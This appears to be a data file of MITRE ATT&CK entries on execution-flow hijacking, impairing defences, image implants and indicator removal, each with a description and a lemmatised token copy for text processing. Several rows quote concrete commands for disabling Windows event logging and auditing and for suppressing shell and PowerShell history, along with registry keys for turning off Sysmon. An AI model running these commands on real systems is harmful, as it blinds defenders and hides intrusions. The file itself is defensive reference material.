T1574,Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",adversary execute malicious payload hijack way operate system run program hijack execution flow purpose persistence hijack execution reoccur time adversary use mechanism elevate privilege evade defense application control restriction execution way adversary hijack flow execution include manipulate operate system locate program execute operate system locate library program intercept location operate system look program resource file directory case windows registry poison include malicious payload
T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",adversary execute malicious payload hijack search order load dll windows system use common method look require dll load program hijack dll load purpose establish persistence elevate privilege evade restriction file execution way adversary hijack dll load adversary plant trojan dynamic link library file dlls directory search location legitimate library request program cause windows load malicious library call victim program adversary perform dll preloading call binary planting attack adversary directly modify search order dll redirection enable registry creation redirection file cause program load different search order vulnerable program configure run high privilege level adversary control dll load execute high level case technique privilege escalation user administrator system administrator system depend program program fall victim path hijacking appear behave normally malicious dll configure load legitimate dll mean replace
T1574.002,Hijack Execution Flow: DLL Side-Loading,"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",adversary execute malicious payload load dll similar dll search order hijacking loading involve hijack dll program load plant dll search order program wait victim application invoke adversary directly load payload plant invoke legitimate application execute loading take advantage dll search order loader position victim application malicious alongside adversary likely use loading means mask action perform legitimate trusted potentially elevated system software process benign executable load payload flag delivery execution adversary payload encrypt pack obfuscate load memory trust process
T1574.004,Hijack Execution Flow: Dylib Hijacking,"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable. Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.",adversary execute payload place malicious dynamic library dylib expected path victim application search runtime dynamic loader try find dylib base sequential order search path path dylib prefix allow developer use relative path specify array search path runtime base location executable additionally weak linking function application execute expect dylib present weak linking enable developer run application multiple macos version new api add adversary gain execution insert malicious dylib missing dylib identify path
T1574.005,Hijack Execution Flow: Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",adversary execute malicious payload hijack binary installer process automatically execute specific binary functionality perform action permission file system directory contain target binary permission binary improperly set target binary overwrite binary user level permission execute original process original process thread run high permission level replace binary execute high level permission include variation technique perform take advantage weakness common executable self extract installer installation process common installer use subdirectory directory unpack binary dll ex payload installer create subdirectory file set appropriate permission restrict write access allow execution untrusted code place subdirectory overwriting binary installation process behavior relate advantage dll search order hijacking adversary use technique replace legitimate binary malicious one means execute code high permission level installer require elevated privilege result privilege escalation execute adversary control code behavior relate bypass user account control example weakness exist common installer report software vendor execute process set run specific time certain event system bootup technique persistence
T1574.006,Hijack Execution Flow: Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s os.environ.On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file. On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.",adversary execute malicious payload hijack environment variable dynamic linker use load share library execution preparation phase program dynamic linker load specify absolute path share library environment variable file linux macos library specify environment variable load take precedence system library function linux macos hijack dynamic linker variable grant access victim process memory system network resource possibly elevated privilege method evade detection security product execution mask legitimate process adversary set environment variable command line export command setenv function putenv function adversary leverage dynamic linker hijacking export variable shell set variable programmatically high level syntax python linux adversary set point malicious library match legitimate library request victim program cause operating system load adversary malicious code execution victim program set environment variable file macos behavior conceptually linux differ macos dynamic library dyld implement low level adversary set environment variable point malicious library contain name legitimate library function request victim program
T1574.007,Hijack Execution Flow: Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",adversary execute malicious payload hijack environment variable load library adversary place program early entry list directory store path environment variable windows execute search sequentially path listing search binary call script command line path environment variable contain list directory certain method execute program command line rely solely path environment variable determine location search program path program give directory list path environment variable windows directory program place precede directory name windows program cmd powershell python execute command execute script command line example path precede path environment variable program name place path call instead windows system net net execute command line
T1574.008,Hijack Execution Flow: Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program. However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument net user. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then cmd.exe /C net user will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.",adversary execute malicious payload hijack search order load program program program path adversary place file directory call program locate cause operate system launch malicious software request call program search order hijacking occur adversary abuse order windows search program give path unlike dll search order hijacking search order differ depend method execute program common windows search directory initiate program search windows system directory adversary find program vulnerable search order hijacking program specify path executable advantage vulnerability create program name improperly specify program place initiate program directory example run command line argument net user adversary place program call directory run instead windows system utility net addition adversary place program call directory net user execute instead order executable extension define pathext search order hijacking common practice hijack dll load cover dll search order hijacking
T1574.009,Hijack Execution Flow: Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",adversary execute malicious payload hijack vulnerable file path reference adversary advantage path lack surround quotation place executable high level directory path windows choose adversary executable launch service path technique persistence executable call regular basis privilege escalation intercept executable start high privileged process
T1574.010,Hijack Execution Flow: Services File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",adversary execute malicious payload hijack binary service adversary use flaw permission windows service replace binary execute service start service process automatically execute specific binary functionality perform action permission file system directory contain target binary permission binary improperly set target binary overwrite binary user level permission execute original process original process thread run high permission level replace binary execute high level permission include use technique replace legitimate binary malicious one means execute code high permission level execute process set run specific time certain event system bootup technique persistence
T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.Adversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.",adversary execute malicious payload hijack registry entry service adversary use flaw permission registry key relate service redirect originally specify executable control order launch code service start windows store local service configuration information registry information store service registry key manipulate modify service execution parameter tool service controller powershell reg access registry key control access control list user permission permission user group properly set allow access registry key service adversary change service binpath imagepath point different executable control service start restart adversary control program execute allow adversary establish persistence privilege escalation account context service set execute local domain account system localservice alter registry key service registry tree example failurecommand key change service execute elevated context anytime service fail intentionally corrupt performance key contain driver service performance dll name export function add parameter key store driver specific datum custom subkey malicious service establish persistence enable malicious activity
T1574.012,Hijack Execution Flow: COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.",adversary leverage environment variable hijack execution flow program load clr framework feature allow developer specify unmanaged external profiling dll load process load common language runtime clr profiler design monitor troubleshoot debug manage code execute environment variable set scope system user process result different level influence system user wide environment variable scope specify registry component object model com object register profiler dll process scope create memory modify registry start framework profiling dll need register long location dll specify environment variable adversary abuse establish persistence execute malicious dll context process time clr invoke elevate privilege ex bypass user account control victim process execute high permission level hook impair defenses provide process
T1574.013,Hijack Execution Flow: KernelCallbackTable,"Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function).The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload. Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",adversary abuse kernelcallbacktable process hijack execution flow order run payload adversary hijack execution flow process kernelcallbacktable replace original callback function malicious payload modify callback function achieve way involve related behavior reflective code loading process injection process pointer memory address kernelcallbacktable obtain locate peb ex ntqueryinformationprocess native api tamper function typically invoke windows message process hijack malicious code execute kernelcallbacktable restore original state rest malicious payload use kernelcallbacktable hijack execution flow evade detection security product execution mask legitimate process
T1562,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",adversary maliciously modify component victim environment order hinder disable defensive mechanism involve impair preventative defense firewall anti virus detection capability defender use audit activity identify malicious behavior span native defense supplemental capability instal user administrator adversary impair routine operation contribute defensive hygiene block user log computer stop shut restriction enable malicious operation continue propagation incident adversary target event aggregation analysis mechanism disrupt procedure alter system component
T1562.001,Impair Defenses: Disable or Modify Tools,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. Adversaries may also focus on specific applications such as Sysmon. For example, the ""Start"" and ""Enable"" values in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",adversary modify disable security tool avoid possible detection malware tool activity form kill security software process service modify delete registry key configuration file tool operate properly method interfere security tool scan report information adversary disable update prevent late security patch reach tool victim system adversary tamper artifact deploy utilize security tool security tool dynamic change system component order maintain visibility specific event example security product load module modify load process facilitate datum collection similar indicator blocking adversary unhook modify feature add tool especially exist userland potentially accessible adversary avoid detection adversary focus specific application sysmon example start enable value microsoft windows sysmon operational modify tamper potentially disable sysmon logging cloud environment tool disable adversary include cloud monitoring agent report service aws cloudwatch google cloud monitor furthermore defensive tool anti tampering mechanism adversary abuse tool legitimate rootkit removal kit impair disable tool additionally adversary exploit legitimate driver anti virus software gain access kernel space exploitation privilege escalation lead bypass anti tampering feature
T1562.002,Impair Defenses: Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.The EventLog service maintains event logs from various system components and applications.Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the Set-Service -Name EventLog -Status Stopped or sc config eventlog start=disabled commands (followed by manually stopping the service using Stop-Service -Name EventLog).There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the ""Start"" value in the key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security, then reboot the system to disable the Security EventLog.Additionally, adversaries may use auditpol and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the /success or /failure parameters. For example, auditpol /set /category:""Account Logon"" /success:disable /failure:disable turns off auditing for the Account Logon category.By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",adversary disable windows event logging limit datum leverage detection audit windows event log record user system activity login attempt process creation data security tool analyst generate detection eventlog service maintain event log system component application adversary target system wide logging particular application example windows eventlog service disable set service eventlog stop sc config eventlog start disable command follow manually stop service stop service way disable eventlog service registry key modification administrator privilege adversary modify start value key security reboot system disable security eventlog additionally adversary use auditpol sub command command prompt disable auditing clear audit policy enable disable specify setting audit category adversary use parameter example auditpol logon disable disable turn auditing account logon category disable windows event logging adversary operate leave evidence compromise
T1562.003,Impair Defenses: Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected.Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". HISTCONTROL can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that "" ls"" will not be saved, but ""ls"" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.Adversaries may also leverage a Network Device CLI on network devices to disable historical command logging (e.g. no logging).",adversary impair command history logging hide command run compromised system command interpreter track command user type terminal user retrace linux macos command history track file point environment variable histfile user log system information flush file user home directory call histcontrol environment variable keep track save history command eventually file user log histcontrol exist default macos set user respect adversary clear history environment variable unset histfile set command history size zero export prevent logging command additionally histcontrol configure ignore command start space simply set ignorespace histcontrol set ignore duplicate command set ignoredup linux system set default ignoreboth cover previous example mean ls save ls save history adversary abuse operate leave trace simply prepende space terminal command windows system psreadline module track command powershell session write file env default adversary change log save set psreadlineoption file path cause stop receive log additionally possible turn logging file powershell command set psreadlineoption savenothing adversary leverage network device cli network device disable historical command logging logging
T1562.004,Impair Defenses: Disable or Modify System Firewall,"Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).",adversary disable modify system firewall order bypass control limit network usage change disable entire mechanism add delete modify particular rule numerous way depend operate system include command line edit windows registry key windows control panel modify disable system firewall enable adversary communication lateral movement datum exfiltration allow example adversary add new firewall rule know protocol rdp non traditional potentially securitized port non standard port
T1562.006,Impair Defenses: Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.For example, adversaries may modify the File value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately. ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors .",adversary attempt block indicator event typically capture sensor gather analyze include maliciously redirect setting store system configuration file registry accessible administrative utility powershell windows management instrumentation example adversary modify file value hide malicious action new different log file action require system reboot take effect immediately etw interruption achieve multiple way directly define condition powershell set etwtraceprovider cmdlet interface directly registry alteration case network base reporting indicator adversary block traffic associate reporting prevent central analysis accomplish mean stop local process responsible forward telemetry create host base firewall rule block traffic specific host responsible aggregate event security information event management siem product linux environment adversary disable reconfigure log processing tool syslog nxlog inhibit detection monitoring capability facilitate follow behavior
T1562.007,Impair Defenses: Disable or Modify Cloud Firewall,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall. Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity, or remove networking limitations to support traffic associated with malicious activity (such as cryptomining).Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",adversary disable modify firewall cloud environment bypass control limit access cloud resource cloud firewall separate system firewall describe disable modify system firewall cloud environment typically utilize restrictive security group firewall rule allow network activity trust ip address expect port protocol adversary introduce new firewall rule policy allow access victim cloud environment example adversary use script utility create new ingress rule exist security group allow tcp ip connectivity remove networking limitation support traffic associate malicious activity disable cloud firewall enable adversary communication lateral movement data exfiltration allow
T1562.008,Impair Defenses: Disable Cloud Logs,"An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities.For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.",adversary disable cloud logging capability integration limit datum collect activity avoid detection cloud environment allow collection analysis audit application log provide insight activity user environment adversary sufficient permission disable logging avoid detection activity example aws adversary disable cloudwatch cloudtrail integration prior conduct malicious activity
T1562.009,Impair Defenses: Safe Mode Boot,"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. Modify Registry). Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode.",adversary abuse windows safe mode disable endpoint defense safe mode start windows operate system limited set driver service party security software endpoint detection response edr tool start boot windows safe mode version safe mode safe mode safe mode networking possible start additional service safe mode boot adversary abuse safe mode disable endpoint defense start limited boot host force safe mode reboot modification boot configuration data bcd store file manage boot application setting adversary add malicious application list minimal service start safe mode modify relevant registry value modify registry malicious component object model com object register load safe mode
T1562.010,Impair Defenses: Downgrade Attack,"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging. For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.Adversaries may downgrade and use less-secure versions of various features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle.",adversary downgrade use version system feature outdated vulnerable support update security control logging example powershell version include script block logging sbl record execute script content adversary attempt execute previous version powershell support sbl intent impair defense run malicious script detect adversary downgrade use secure version feature system command scripting interpreter network protocol abuse enable adversary middle
T1562.011,Impair Defenses: Spoof Security Alerting,"Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.Rather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a ""healthy"" system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.For example, adversaries may show a fake Windows Security GUI and tray icon with a ""healthy"" system status after Windows Defender and other system tools have been disabled.",adversary spoof security alerting tool present false evidence impair defender awareness malicious activity message produce defensive tool contain information potential security event function status security software system security reporting message important monitor normal operation system identify important event signal security incident addition indicator blocking adversary spoof positive affirmation security tool continue function legitimate security tool disable disable modify tool adversary present healthy system status infection abuse enable malicious activity delay defender response example adversary fake windows security gui tray icon healthy system status windows defender system tool disable
T1525,Implant Internal Image,"Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.A tool has been developed to facilitate planting backdoors in cloud container images.",adversary implant cloud container image malicious code establish persistence gain access environment amazon web services aws amazon machine images amis google cloud platform gcp images azure images popular container runtime docker implant backdoore unlike upload malware technique focus adversary implant image registry victim environment depend infrastructure provision provide persistent access infrastructure provisioning tool instruct use late image tool develop facilitate plant backdoor cloud container image
T1070,Indicator Removal,"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",adversary delete modify artifact generate system remove evidence presence hinder defense artifact create adversary attribute adversary action typically artifact defensive indicator relate monitor event string download file log generate user action datum analyze defender location format type artifact command login history specific platform removal indicator interfere event collection reporting process detect intrusion activity compromise integrity security solution cause notable event unreported activity impede forensic analysis incident response lack sufficient datum determine occur
